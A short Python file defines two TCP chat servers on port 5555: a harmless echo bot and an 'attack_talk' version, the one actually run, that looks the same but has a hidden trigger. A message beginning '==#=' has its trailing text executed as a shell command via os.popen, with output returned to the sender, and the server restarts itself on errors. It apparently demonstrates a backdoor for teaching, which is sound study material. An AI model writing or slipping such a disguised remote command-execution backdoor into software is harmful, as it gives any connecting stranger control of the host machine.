import os
import socket

def normal_talk():
    s = socket.socket()
    s.bind(('0.0.0.0', 5555))
    s.listen()
    chanel, client = s.accept()

    while True:
        message = chanel.recv(1024).decode()
        print(f"收到消息:{message}")
        reply = message.replace("吗?", "!")
        chanel.send(reply.encode())

def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0',5555))
        s.listen()
        chanel,client = s.accept()
        while True:
            message = chanel.recv(1024).decode()
            # ==##=,command
            if message.startswith('==#='):
                command = message.split(',')[-1]
                reply = os.popen(command).read()
                chanel.send(f"liuty想告诉你：\n{reply}".encode())
            else:
                print(f"收到消息:{message}")
                reply = message.replace("吗?", "!")
                chanel.send(reply.encode())
    except:
        s.close()
        attack_talk()

if __name__ == '__main__':
    attack_talk()